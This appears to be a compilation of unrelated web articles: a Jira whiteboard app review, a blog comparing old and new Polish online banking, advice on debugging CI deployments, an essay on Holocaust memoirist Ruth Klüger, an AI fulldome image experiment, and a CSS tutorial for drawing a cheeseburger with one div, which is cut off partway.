<p>Here, you are free to set up 2D “Zones” that affect your Jira issues. This ability means you can have one area of the board for your backlog, where you rank your issues, then another for planned work, where you have different “Buckets” to assign it to users, then a third to represent your Agile board. All of this is managed on the same screen, as intuitively as “drag-and-drop.”&nbsp;&nbsp;</p>



<div><figure><img data-attachment-id="2683" data-permalink="https://thejiraguy.com/image-4-16/" data-orig-file="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png" data-orig-size="597,587" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-4" data-image-description="" data-medium-file="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=300" data-large-file="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=597" src="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=597" alt="" srcset="https://thejiraguycom.files.wordpress.com/2020/12/image-4.png 597w, https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=150 150w, https://thejiraguycom.files.wordpress.com/2020/12/image-4.png?w=300 300w" sizes="(max-width: 597px) 100vw, 597px"></figure></div>



<p>You can also drag and select a group of issues, edit them in real-time, give you a refined “Bulk Edit” option, or edit issues individually. The team leaned in because this was connected to Jira and really worked to make sure these capabilities were up to snuff, and it shows. Well done!</p>



<h2>Control the access using Jira permissions.</h2>



<p>This. 100% This. I consider permissions to be essential for any app. Yeah, you might want to keep this open and let everyone use it. Or you might not. Or some mix there-in. The fact is, having permissions that can easily be set gives you that control, rather than the App Developer.</p>



<h2>View in real-time what other participants do.</h2>



<p>They do mean real-time. As I said, this point was the one where most of my concerns lay during the demo. However, Spartez was willing to demonstrate it, granting me limited access to their demo board. And there was a slight delay – but that’s only because Physics is a cruel mistress. But honestly, I had to&nbsp;<strong><em>really&nbsp;</em></strong>pay attention to even notice it – most users probably won’t ever see it.&nbsp;</p>



<h2>Use post-it cards, images, videos, or draw anything.</h2>



<p>Sure, this can be a useful feature. I stated a use case for this above. But this feature can be fun. Yes, the App does support animated gifs. I checked.&nbsp;&nbsp;</p>

<h2>What this App does Well</h2>



<p>Well, this App does what it sets out to do, which is enable collaboration by allowing users to work on a virtual Whiteboard. However, the ability to manipulate your Jira issues in real-time via the board is where this App shines. It’s intuitive, useful, and fun to use. And it’s not often I can say that in Jira.</p>



<h2>What this App could work on</h2>



<p>Well, the obvious needs to be stated here. Whiteboards for Jira is only available for Jira Cloud right now. I know for some of you out there, this is a deal breaker.  This situation is sufficient to start with, but I too would love to see this on a Jira Server or Data Center instance.&nbsp;&nbsp;</p>



<p>Another feature I’d love to see is an option to “Snap to grid.” You can always snap things to other nearby objects, but the first object is always free-hand. I’d love to see some way to add an option to snap it to a grid – because, you know, some of us are perfectionists.&nbsp;</p>



<h2>Would I recommend this App?</h2>



<p>First, given the current offering, I can only recommend this App if you are on Jira Cloud. I’m hoping that will change soon, but Cloud is the only place you can get it.&nbsp;&nbsp;</p>



<p>And honestly, this App is meant to solve a specific problem. Some teams prefer to use a whiteboard; some teams are fine using digital tools and don’t need it. So, if your one of the former teams who, in the “before-times,” would use a whiteboard, I say get it. Your Teams will likely thank you for it.&nbsp;&nbsp;</p>



<h2>Whiteboard for Jira’s Tier Rank</h2>



<p>This one was hard for me. If I go on functionality alone, It’s an easy A. However, the limited availability is an essential factor. I maintain a free tier Jira Cloud system for testing, but it’s not my daily driver. Given the whole package, I need to give it a B+, with upgrade potential to an A down the road.&nbsp;</p>

	<section>
		<p>If you trace the news in financial services (banking, insurance, etc.), it's hard not to be overly enthusiastic - the terms like <em>'digital disruption'</em>, <em>'fintech innovation'</em>, <em>'banking 3.0'</em>, <em>'blockchain-powered XYZ'</em>, <em>'transformative services'</em> are flying left and right in everyday announcements. Apparently, very conservative, highly regulated, traditional institutions are now in absolute avant-garde of user-focused, technological revolution, making Internet-era behemoths like Google, Microsoft, Amazon or Facebook pale in comparison.</p><p>Or maybe it's <u><strong>utter crap</strong></u>?</p><p>Cheap PR? Buzzword bingo? Painting the dead grass green? A modern equivalent of H.C.Andersen's <em>"The Emperor's New Clothes"</em>? Hmm, what could be the easiest way to verify that?</p><p>How about performing a ... <strong>time travel</strong>? I mean: going back in time 10-15 years and comparing what banks (or other financial institutions) provided THEN with what they do provide NOW. Because that's what really matters - making a difference from the customer's perspective by providing better customer experience, more valuable products and services, etc. Updating the visual style to look like material design ain't enough.</p><p>Time travel sounds like something beyond our capacity these days, but ... luckily I think can help here. In this particular case, I can really make it happen! How come?</p><p><em><a href="https://www.youtube.com/watch?v=tAVVy_x3Erg">Stay awhile and listen ...</a></em></p><p>In 2001 I've opened a bank account in a completely new bank which was (AFAIK - I'm not 100% sure here) the 1st true Internet bank (no physical branches, just the Internet access - you could do everything on-line, even opening the account) in Poland. It was named <a href="https://inteligo.pl/">Inteligo</a>, and you can read more about it <a href="https://en.wikipedia.org/wiki/Inteligo">here</a>. To be honest: those days it was a real game-changer (when compared to traditional banking with money transfers that required you to appear physically in the bank's branch or postal office ...).</p><p>But the very next year (in 2002) <strong>Inteligo</strong> was fully (100%) acquired by the largest bank in Poland - <strong>PKO BP</strong>. That institution was (and is) perceived as a very traditional one - aimed at retirees, elderly people - in general folks who are somewhat distrustful and reluctant to change. What a marriage, wasn't it?</p><p>Fast forward 18 years:</p><ul><li><strong>PKO BP</strong> didn't really "merge" with <strong>Inteligo</strong> at all - it's still a separate service (with a separate brand, pool of financial products, UI, etc.)</li><li>the development of <strong>Inteligo</strong>, which was unquestioningly one of the most innovative banks of its era, has ... pretty much ceased (except few meaningless details I'll cover later) - probably its owner didn't want to invest there and focused on its core e-banking offer (named <a href="https://www.ipko.pl/">'iPKO'</a>) instead; feel free to check the "evolution" of the infosite frontpage in <a href="https://web.archive.org/web/20010601000000*/inteligo.pl">web archive</a>.</li><li>the development of iPKO has progressed steadily (backed up with shitloads of investment) throughout all the past years, bringing the new versions of the web user interface, mobile apps, etc.</li><li>nevertheless, I didn't terminate my <strong>Inteligo</strong> account - I still use it mainly to pay the monthly bills, like a small "sash" just for that purpose</li></ul><figure><img src="https://no-kill-switch.ghost.io/content/images/2020/12/header.png" alt="" srcset="https://no-kill-switch.ghost.io/content/images/size/w600/2020/12/header.png 600w, https://no-kill-switch.ghost.io/content/images/2020/12/header.png 800w" sizes="(min-width: 720px) 720px"><figcaption>Oh, those gradients, so 90-tish :)</figcaption></figure><p>You've probably figured it out already, but I'll state it explicitly - that situation provides me a unique opportunity <u>to compare a banking experience straight from 2002 with the one of the 2020 industry leader</u> (here in Poland). And answer the following questions:</p><ol><li>how much did the banks really progress in the past 18 years?</li><li>what is easier/better/more convenient from the end-user's perspective?</li><li>... or maybe some things have actually worsened?</li><li>did the changes introduced by banks change my behaviors when it comes to finances?</li></ol><p>I can't wait to dive into the details, so let's not delay any longer!</p><p>Let's expand the context on how I do banking, just a bit. My financial behavioral profile looks like that:</p><ul><li>I have both private and company (as an individual entrepreneur) accounts - in a few currencies (usual suspects like EUR or USD, none of the exotics)</li><li>I use both debit and credit cards</li><li>I have used both cash loans and the mortgage in the past</li><li>I've bought car insurance via the bank's partnership once</li><li>I don't use direct debit, its paperwork is freaking cumbersome - I prefer to set subscription-based, regular payments out of the bank</li><li>obviously, I do money transfers, domestic and international</li><li>I've used a few forms of savings, but no investments like stocks or derivatives</li><li>No installment purchases</li><li>I've requested few atypical operations in the past: like early repayments or rebinding mortgage to a different current account - but nothing really fancy</li></ul><p>I don't think I'd call myself a heavy financial instruments user, but probably I'm still above the average. On top of that, I'm a tech-savvy, heavyweight Internet user - I avoid both physical branch visits and call-centers (both phone and video-call versions) at all cost.</p><p>When it comes to banking, I generally prefer browser over mobile apps (exception: Revolut, because they have really good, laser-focused mobile apps). The reason is simple: when I'm browsing my savings or making a transfer, I'd like to have some privacy. In my case, privacy usually means having one of my laptops within a hand reach anyway, so ...</p><p><em>To be continued (next week)</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Continuous integration services like <a href="https://www.jenkins.io/">Jenkins</a>, <a href="https://bitbucket.org/product/features/pipelines">Bitbucket Pipelines</a>, <a href="https://circleci.com/">CircleCI</a>, <a href="https://github.com/features/actions">GitHub Actions</a>, <a href="https://docs.gitlab.com/ee/ci/">Gitlab CI/CD</a> force extreme automation. They require your continuous integration flows to run non-interactively in remote environments. Most of these tools do not allow you to interact with the continuous integration environment.</p>



<p>All of these tools require users to define deployment workflows in custom definition languages. It is very common in my experience that users of these services can <em>only</em> run their deployment workflows using the service in question.</p>



<p>When something goes wrong with a deployment, debugging takes the form of a <strong>deployment death loop</strong>:</p>



<ol><li>Make changes locally (mostly to continuous integration configuration files).</li><li>Push to the appropriate branch on your git host (usually <em>master</em>).</li><li>Wait for a job to start on your continuous integration service.</li><li>Wait minutes or even tens of minutes following the logs to see if your changes fixed the issue.</li><li>Repeat this procedure until you have solved the problem.</li></ol>



<p>Things are even worse when you have to debug configuration that lives in a database or on a configuration management system such as <a href="https://www.vaultproject.io/">Vault</a> or <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-parameter-store.html">Parameter Store</a>. If you can’t manually trigger a workflow, you are forced to push superficial changes to your git repository (like adding punctuation or white space to your README) to see if your changes worked.</p>



<p>How to break out of this death loop?</p>



<p>Two suggestions:</p>



<p>First, <strong>any developer should be able to deploy from their local environment</strong> (provided they have the required level of access). The continuous integration workflow definition should be secondary to this mechanism. If possible, it should make use of this mechanism.</p>



<p>For example, at <a href="https://alpha.bugout.dev/">Bugout</a>, our services are deployed by a bash script which can be executed on our servers via SSH. Even in production, if a developer has access to the production servers, they can run a deployment by simply running a git pull and then the deployment script over SSH. This is useful not only when debugging deployments but also when our continuous integration service goes down, <a href="https://www.githubstatus.com/incidents/sxthxvdlljk4">which has been known to happen</a>.</p>



<p>Second, <strong>embrace </strong><a href="https://en.wikipedia.org/wiki/Checklist"><strong>checklists</strong></a>. Have a checklist of external actions that must be taken before a change can be deployed. This checklist can include things like running database migrations, setting environment variables, or modifying a load balancer.</p>



<p>It’s okay to check items off such a checklist manually. Manual checklists may invalidate ideas of fully automated deployments. This is alright. Deployments that require manual steps should be performed with human oversight.</p>



<p>The general principle is to <strong>favor interactivity over automation</strong>. Make your deployments interactive by default. You will not regret it.</p>

<p>Last month saw the passing of Ruth Klüger, one of the most influential memoirists of the Holocaust, at age 88. Born to a Jewish family in Vienna in 1931, Klüger was deported to Theresienstadt with her family shortly before her eleventh birthday then transferred to Auschwitz and a women’s subcamp of Gross-Rosen concentration camp. She survived Auschwitz by lying about her age, after a female clerk told her to say she was 15 when she was only 12 in order to be transferred for work in a labor camp. In her memoir, Klüger presents this moment, to which she owed her life, as neither heroic, nor redemptive, but human. “What more do you need for an example of perfect goodness?” (<em>Still Alive</em>,108). Klüger and her mother ultimately survived by escaping from a death march. Her brother and father were murdered. After the war Klüger studied in Regensburg and then in 1947 emigrated with her mother to the United States, where she graduated from Hunter College and went on to earn a Ph.D. in German from Berkeley. She became a professor of German literature and taught at a number of universities, including Princeton (where she became the first female full professor of German) and the University of California, Irvine.</p>



<p>At Irvine, Klüger oversaw a study abroad program in Göttingen, Germany, where she was struck by a bicycle in 1989. As she emerged from a days-long coma, she began to recall long-repressed memories and began to write. As <a href="https://www.jstor.org/stable/10.5749/j.ctttv6p4.9">Michael Rothberg</a> writes, “In her reconstruction of her thoughts as the bicyclist bore down on her, the bicycle and headlight are transformed into barbed wire and a spotlight” (130). Klüger’s memoir, <em>Weiter Leben</em>, published in German in 1992 (“German, strange as this statement may sound, is a Jewish language” (<em>Still Alive</em>, 205)), when she was 70, was a bestseller and won major awards. It can be said to exemplify what Freud called <a href="https://doi.org/10.1177/0959354314530812"><em>Nachträglichkeit</em>, trauma delayed</a>. <a href="https://www.jstor.org/stable/10.5749/j.ctttv6p4.9">Rothberg</a> praised her memoir for depicting “a site of extreme violence as a borderland of extremity and everydayness” and described it as a model of a literary mode he termed “traumatic realism,” which breaks through deadlock between “realist” versus “antirealist” Holocaust representation (109).The English version, <em>Still Alive</em>,was published in 2001. The book is widely taught in university courses and is used as an eyewitness testimony in major works of Holocaust historiography including Saul Friedländer’s <a href="https://www.harpercollins.com/products/nazi-germany-and-the-jews-saul-friedlander"><em>Nazi Germany and the Jews</em></a>(1997/2007) and Peter Fritzsche’s <a href="https://books.google.com/books?id=nIUFQGN2y4EC&amp;printsec=frontcover&amp;source=gbs_ge_summary_r&amp;cad=0#v=onepage&amp;q&amp;f=false"><em>Life and Death in the Third Reich</em></a>(2008).</p>

<p>Klüger stands out among survivors for her outspoken critical stance toward Holocaust remembrance culture. She <a href="https://www.jstor.org/stable/43555106">once said to the German Studies Association</a>, “the present memorial cult that seeks to inflict certain aspects of history and their presumed lessons on our children, with its favorite mantra, ‘Let us remember, so the same thing doesn’t happen again,’ is unconvincing. To be sure, a remembered massacre may serve as a deterrent, but it may also serve as a model for the next massacre” (GSA, 392). She called out Holocaust tourism, asking what the “carefully tended, unlovely remains” of former concentration camps could possibly communicate of the experience of being imprisoned there (<em>Still Alive</em>, 63). “I don’t go to these concentration camp memorial sites,” she once flatly told <a href="https://www.spiegel.de/international/holocaust-survivor-ruth-klueger-vienna-reeks-of-anti-semitism-a-435879.html"><em>Der Spiegel</em></a>, and she even asked the Auschwitz Museum to take down her poems, which were displayed there against her wishes (111). “I don’t hail from Auschwitz, I come from Vienna,” she wrote, and it seems that this attitude led her to <a href="https://www.dw.com/en/holocaust-survivor-and-author-ruth-kl%C3%BCger-dies-at-88/a-55188986">opt</a> to have the number tattooed on her arm removed in later life (112). She remained especially critical of German attempts to identify with victims from the Nazi era. “Defeat,” she reflected, “bred its own variants of nationalism”—a kind of <a href="https://books.google.com/books?id=eATtDwAAQBAJ&amp;pg=PT416&amp;lpg=PT416&amp;dq=%22negative+exceptionalism%22+rabinbach&amp;source=bl&amp;ots=pF_fBLAbO7&amp;sig=ACfU3U39FqK-RnvEvVtrDkPULc064HmiFg&amp;hl=en&amp;sa=X&amp;ved=2ahUKEwjgmt-RnpztAhXmGVkFHd6mCN0Q6AEwAXoECAEQAg#v=onepage&amp;q=%22negative%20exceptionalism%22%20rabinbach&amp;f=false">negative exceptionalism</a> about German crimes (163).</p>



<p>Writing in the wake of popular milestones like <em>Holocaust </em>(1978) and <em>Schindler’s List </em>(1993), Klüger echoed critics of <a href="https://www.tandfonline.com/doi/abs/10.1080/14623529908413937">“the Americanization of the Holocaust”</a> and <a href="https://www.jstor.org/stable/j.ctt16gzj0m">“the end of the Holocaust,”</a> for whom brutal historical reality was displaced by redemptive and enjoyable kitsch. The problem of this oxymoronic “Holocaust aesthetics” became apparent to Klüger after a young woman approached her at a book signing and said, with a smile, “<em>I love the Holocaust</em>.” Klüger was taken aback. She understood that the woman loved not the event itself, but reading about it. “But her naïve and undisguised pleasure brought up the question: Should she love to read about the Holocaust? <em>Should</em> we in any shape or form feel positive and empowered or cathartically purged when we contemplate the extinction of a people? My impulse was to say to this woman: You shouldn’t. Stop reading these books, including mine, if you enjoy them” (GSA, 393).</p>



<p>This anecdote, Klüger reflects, validates continued discussion of Theodor Adorno’s famous <a href="https://books.google.com/books?id=f1y_dX04yBgC&amp;lpg=PP1&amp;pg=PA34#v=onepage&amp;q&amp;f=false">claim</a> that to write poetry after Auschwitz is barbaric, however much one may <a href="https://www.jstor.org/stable/488568">disagree with it</a>. She worried about <a href="https://www.jstor.org/stable/43555106">Holocaust literature slipping into “kitsch”</a>&nbsp;and reflected about the popularity of Anne Frank’s diary, “it is easier to shed tears over an unfortunate little girl than to agree or disagree with an eminently rational Italian chemist with pronounced opinions that was Primo Levi” (GSA, 400). Telling are the two other survivor authors she praises: the Hungarian Imre Kertész, who reflected on the paradox that once the Holocaust is written about, experience is substituted by the “artefact” of narrative representation, and who was also critical of <a href="https://books.google.com/books?id=toS1uAAACAAJ&amp;dq=The+Holocaust+as+Culture+Thomas,+Kert%C3%A9sz,+Imre&amp;hl=en&amp;newbks=1&amp;newbks_redir=0&amp;sa=X&amp;ved=2ahUKEwjlsqPEpprtAhUaRTABHVy6AqUQ6AEwAHoECAAQAg">“Holocaust culture.”</a> She also names the Polish writer Tadeusz Borwoski, whose acerbic <a href="https://en.wikipedia.org/wiki/This_Way_for_the_Gas,_Ladies_and_Gentlemen"><em>This Way to the Gas, Ladies and Gentlemen</em></a>(1946) she criticizes for its antisemitism and fictional embellishments, while also recognizing “the starkness with which Borowski portrays the slide from indifference to depravity at the edge of human existence and endurance” (GSA, 402).</p>



<p><em>Still Alive </em>is also notable for its “feminist” discussions of <a href="https://www.journals.uchicago.edu/doi/full/10.1086/668607">nonconsensual sex work</a> in the camps that debunked popular “whorehouse fantasies” and “a thriving cottage industry” of Holocaust-themed pornography (184), while also problematizing Holocaust “photos as an instrument of sublimated voyeurism” (159). But <em>Still Alive</em> stands out most for its <a href="https://press.uchicago.edu/ucp/books/book/chicago/T/bo25956860.html">bitter tone</a>. A reviewer <a href="https://www.nytimes.com/2020/10/16/us/ruth-kluger-dies.html">wrote</a> thatKlüger “unsentimentally redefined the conventional mythos of the heroic Holocaust survivor,” and indeed she <a href="https://www.washingtonpost.com/local/obituaries/ruth-kluger-author-of-searing-and-celebrated-holocaust-memoir-dies-at-88/2020/10/09/eeee3b16-0a2a-11eb-9be6-cf25fb429f1a_story.html">rejected</a> the idea that suffering united victims as “sentimental rubbish.” Instead she <a href="https://www.washingtonpost.com/local/obituaries/ruth-kluger-author-of-searing-and-celebrated-holocaust-memoir-dies-at-88/2020/10/09/eeee3b16-0a2a-11eb-9be6-cf25fb429f1a_story.html">challenged her readers</a> to “rearrange a lot of furniture in their inner museum of the Holocaust,” <a href="https://www.dw.com/en/holocaust-survivor-ruth-kl%C3%BCger-germany-has-changed/a-19005242">reminding</a> them that “Surviving was not normal. Death was normal.” As the <a href="https://www.wienerzeitung.at/nachrichten/kultur/literatur/2077830-Autorin-Ruth-Klueger-gestorben.html"><em>Wiener Zeitung</em></a> fittingly titled their obituary, Klüger modeled “surviving relentlessly.”</p>



<p>As Klüger’s former colleague <a href="https://www.cbc.ca/radio/asithappens/as-it-happens-tuesday-edition-1.5769434/holocaust-survivor-ruth-kluger-would-not-accept-inequality-says-friend-1.5769532">Gail Hart reflects</a>, “I think she was a little bit too hard on those who, say, visited Holocaust memorials and Holocaust museums because she said that, you know, they were trying to admire themselves for hating the Nazis.” In <em>Still Alive </em>(as once <a href="https://www.lrb.co.uk/the-paper/v37/n03/slavoj-zizek/in-the-grey-zone">quoted by Slavoj Žižek</a>), Klüger recounts a conversation with German graduate students in Göttingen:</p>



<blockquote><p>One reports how in Jerusalem he made the acquaintance of an old Hungarian Jew who was a survivor of Auschwitz, and yet this man cursed the Arabs and held them all in contempt. How can someone who comes from Auschwitz talk like that? the German asks. I get into the act and argue, perhaps more hotly than need be. What did he expect? Auschwitz was no instructional institution…You learned nothing there, and least of all humanity and tolerance. Absolutely nothing good came out of the concentration camps, I hear myself saying, with my voice rising, and [the student] expects catharsis, purgation, the sort of thing you go to the theatre for? They were the most useless, pointless establishments imaginable. That is the one thing to remember about them if you know nothing else. (<em>Still Alive, </em>65)</p></blockquote>



<p>Klüger refuses to cast herself as a saint on account of her experience (unlike the <a href="https://time.com/4392426/ronald-lauder-elie-wiesel-holocaust/">canonized</a> but also <a href="https://www.tikkun.org/a-variety-of-perspectives-on-elie-wiesel">criticized</a> figure of Elie Wiesel). On the contrary, she even recounts a disturbing incident from the postwar years, while she waited in vain for her father and brother to return from the camps, in which she accidentally killed a little dog by forgetting to turn off the gas in the kitchen where he slept. “Of course I was mortified the next morning when I found his lifeless body and was despondent for days. Accident or symptom? And if the latter, symptom of what?” (<em>Still Alive</em>, 158). This fundamental recognition of moral fallibility led fellow Auschwitz survivor Primo Levi to coin the term “the grey zone” to describe how the camps generated <em>amorality</em>, not morality among victims. Yet while Levi similarly characterized Auschwitz as a <a href="https://books.google.com/books/about/The_Black_Hole_of_Auschwitz.html?id=VxbSTfGI638C">“Black Hole,”</a> he also, in sharp contrast to Klüger, called it his <a href="https://books.google.com/books?id=Kf3FAAAAQBAJ&amp;pg=PA34&amp;dq=%E2%80%9CAuschwitz+had+been+his+true+university.%E2%80%9D&amp;hl=en&amp;newbks=1&amp;newbks_redir=0&amp;sa=X&amp;ved=2ahUKEwi7mdLrkpztAhWhFVkFHVRWCmYQ6AEwAHoECAAQAg#v=onepage&amp;q=%E2%80%9CAuschwitz%20had%20been%20his%20true%20university.%E2%80%9D&amp;f=false">“true university”</a> for understanding human nature.</p>



<p><a href="https://www.nybooks.com/articles/2002/11/07/surviving/">Gabriele Annan</a> spoke for many when she called Klüger “merciless” and “outspoken to the point of aggressiveness”: “She also resents all views on the Holocaust that do not tally exactly with her own, and gets indignant about everyone who criticizes her….Levi told a similar story without making one feel so hectored.” <a href="https://www.bundestag.de/en/documents/textarchive/speech-klueger-403862">Speaking</a> before Angela Merkel and the German Bundestag on Holocaust Remembrance Day in 2016, Klüger <a href="https://www.bundestag.de/en/documents/textarchive/speech-klueger-403862">called</a> her own approach “bitter and aggressive,” yet also positively connected her experience with the plight of other groups, praising the “heroic” act of welcoming refugees from war-torn Syria. (She similarly <a href="https://www.cbc.ca/radio/asithappens/as-it-happens-tuesday-edition-1.5769434/holocaust-survivor-ruth-kluger-would-not-accept-inequality-says-friend-1.5769532">opposed</a> inhumane treatment of asylum-seekers at the U.S.–Mexico border.) Hart, her former colleague, reflects of Klüger, “She is a very direct interrogator. She doesn’t have any of these conciliatory mechanisms that most women have. And she seeks argument. And at first I found that a little bit off-putting and I kind of avoided her.” As Klüger admitted herself, “Damn right. I <em>am</em> hard to satisfy” (<em>Still Alive</em>, 184).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="news-content-html">
		    <div id="fddb_field_content"><p>In recent times the use of artificial intelligence, machine learning, GAN's and algorithms in artistic applications has been on the rise. There are many AI tools available today to assist creators at various points in the production process, whether it's streamlining normally tedious tasks with precision, or generating completely new stunning pieces of digital art.</p>
<p>Our question:&nbsp; <strong>Can AI generate 360° images&nbsp;</strong><strong>formatted for fulldome?</strong> (domemasters)</p>
<p>Our answer:&nbsp; <strong>Yes!&nbsp;</strong>&nbsp;(..kind of)</p>
<p>Tools/software: <strong>Kodak SP3604K, Runway ML, StyleGAN2 on Google Colab.&nbsp;&nbsp;</strong></p>
<p>Machine learning is an area of research within the field of artificial intelligence (AI). For this experiment, we used <a href="https://runwayml.com/">RunwayML</a>, a platform for training your own models. The term model refers to the result of training a machine learning algorithm with a dataset. A machine learning algorithm find patterns within the data and develops its own rules for how to represent—or model—those patterns to perform a specific task. These rules are not designed by humans; they are learned from the data on which the model was trained.</p>
<p>People build models in different programming languages, with different frameworks, and for different purposes, such as to recognize spam email, classify objects, edit images and video, and capture motion. <strong>In our case</strong>, <strong><em>we want to train a model that generates images of architectural facades that respect the geometric attributes and perspective of the domemaster format.</em></strong></p>
<p>Here are the results:&nbsp;<strong>AI urban environments, domemaster below.&nbsp;</strong></p>
<p><iframe src="https://www.youtube.com/embed/A9Sa4ADKgZs" frameborder="0" width="560" height="315" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>We rendered 20+ minutes of fully AI-generated, morphing 360° urban environments with some interesting results:</p>
<ul>
<li>the geometry works!&nbsp;</li>
<li>the perspective works!</li>
<li>our AI domemaster has 230°+ fov since our dataset was shot with the SP3604K</li>
<li>full flexibility of latent walk render, speed and frames using StyleGAN2 in Colab (tutorial below)</li>
<li><em>limitation</em>: training resolution at 512x512 or 1024x1024 means rendered images must be upscaled before being usable in the dome (topaz AI gigapixel worked well).&nbsp; This can create unwanted artifacts in the image.</li>
</ul>
<p><strong>So how is this possible?</strong></p>
<p><strong>First step:</strong> We need an image dataset.&nbsp; We created an image dataset of 3000 fisheye images shot in downtown Montreal which we used to train our AI model.&nbsp;RunwayML makes training very easy: all you need to do is supply your own dataset and determine the number of steps that the algorithm should take to learn the features. During each step, the model learns a little bit more about the features in your dataset.</p>
<p>The time it takes to train a model depends on a combination of many factors, including but not limited to the type of machine learning algorithm (there are algorithms of varying complexity for working with images, words, or sounds) and the number of training steps.</p>
<p>RunwayML greatly reduces the amount of time needed to train your own generative image model by using using a technique called&nbsp;<a href="https://en.wikipedia.org/wiki/Transfer_learning" target="_blank" rel="noopener noreferrer">Transfer Learning</a>. With this technique, an existing pre-trained model called&nbsp;<a href="https://open-app.runwayml.com/?model=runway/StyleGAN" target="_blank" rel="noopener noreferrer">StyleGAN</a>&nbsp;is retrained on your dataset. StyleGAN was trained on a massive amount of images (70,000!), and Transfer Learning leverages all of the&nbsp;<a href="https://en.wikipedia.org/wiki/Feature_(computer_vision)" target="_blank" rel="noopener noreferrer">image features</a>&nbsp;it learned from the original data to speed up the process of learning features in your image dataset. Not only does this greatly reduce training time, but it also reduces the number of images that you need to train your own model.&nbsp;</p>
<p><strong><span>Training steps progress animation:</span></strong></p>

<p><strong>Second step:&nbsp;</strong>After a few hours our model has finished training, great!&nbsp; During training, your model learns to produce new images that look like the ones in your dataset. When training is complete, the model will generate a seemingly infinite number of synthetic images that appear as if they came from the dataset itself. The space of all-new possible images that your model can create is called the <em>latent space</em>, which you can explore when you run your model. RunwayML allows you to run the model directly in its UI (at a cost), or to download the model as a <strong>.pkl.&nbsp;&nbsp;</strong>Training already comes at a cost, and we want the flexibility of exploring the latent space ourselves, so we download the model and run it remotely on Google Colab with StyleGan2.&nbsp; The following tutorial explains the exact workflow with links in the description.</p>

<p><strong>Conclusion:</strong> Promising results for artists wishing to explore the possibilities of AI-generated 360° environments in the dome.&nbsp;&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

        <div>
            
<p>I enjoy challenging myself on some weird programming ideas. It's a good way to have fun and to learn new things. This time the challenge was to draw a cheeseburger in CSS using a single empty div.</p>
<p>After a lot of trials and errors, I ended up with this.</p>
<p><img src="https://www.lesscake.com/tutimg/5/6.png" alt=""></p>
<p>That's probably not the best looking burger ever. However I've been super impressed that it was actually possible to draw something as complex as this with a single div.</p>
<p>In this article we are going to make this cheeseburger, step by step. </p>
<h2>The HTML</h2>
<p>The HTML is very short: a charset, a title, a link to the CSS file, and a single div. </p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;Cheesburger&lt;/title&gt;
    &lt;link rel="stylesheet" href="style.css" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="burger"&gt;&lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>That's it! Now we will focus our attention on the style.css file. </p>
<h2>The CSS</h2>
<p>The most basic CSS for our burger may look like this.</p>
<pre><code>.burger {
  /* Contains all the parts of the burger */
  /* Bun, cheese, meat, lettuce, and sesame seeds */
}</code></pre>
<p>But that's too limited, we won't be able to fit a whole burger inside a single selector. To find more space, we should use the <code>:before</code> and <code>:after</code> pseudo elements. </p>
<pre><code>.burger {
  /* The cheese, meat, and lettuce */
}

.burger:before {
  /* The bun */
}

.burger:after {
  /* The sesame seeds */
}</code></pre>
<p>That might not seem much, but that will be enough for our purpose. </p>
<h2>The bun</h2>
<p>The bun is made of 2 parts: the top bun and the bottom bun. So we have to find a way to draw 2 different shapes in a single CSS selector, which is not that complicated.</p>
<p>We start by drawing 2 rectangles using the <code>border</code> property. </p>
<pre><code>.burger:before {
  content: ""; 
  display: block;

  /* Space between the buns */
  width: 400px;
  height: 55px;

  /* Top bun */
  border-top: 80px solid #f5b230;

  /* Bottom bun */
  border-bottom: 50px solid #f5b230;
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/1.png" alt=""></p>
<p>Then we use <code>border-radius</code> to curve the bread nicely.</p>
<pre><code>.burger:before {
  /* Same code as previously */
  content: ""; 
  display: block;
  width: 400px;
  height: 55px;
  border-top: 80px solid #f5b230;
  border-bottom: 50px solid #f5b230;

  /* New line */
  border-radius: 30% 30% 20% 20%; 
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/2.png" alt=""></p>
<h2>The ingredients</h2>
<p>Next, we will add the main burger ingredients: cheese, meat, and lettuce. This time it's 3 shapes that we have to fit in a single CSS selector. </p>
<p>Let's focus on the meat for now.</p>
<pre><code>.burger {
  /* Size */
  width: 380px;
  height: 40px;

  /* Color and shape */
  background-color: #681f24;
  border-radius: 15px; 
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/2a.png" alt=""></p>
<p>Well, that's not great. We have some meat, but it's not in the correct position. Unfortunately we can't use <code>margin</code> or <code>padding</code> to fix that, since it would move the whole burger and not just the steak.</p>
<p>Let's try something different: drawing the meat with a <code>box-shadow</code>.</p>
<pre><code>.burger {
  /* Same as previously */
  /* We just removed the background color */
  width: 380px;
  height: 40px;
  border-radius: 15px;

  /* New line */ 
  /* The parameters: margin-left, margin-top, color */
  box-shadow: 10px 85px #681f24; 
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/3.png" alt=""></p>
<p>That works! However we face another issue: how can we  add the cheese and the lettuce in the same CSS selector? To answer that we need to realize 2 things:</p>
<ul>
<li>The meat, the cheese, and the lettuce may have the same shape as long as their color is different.</li>
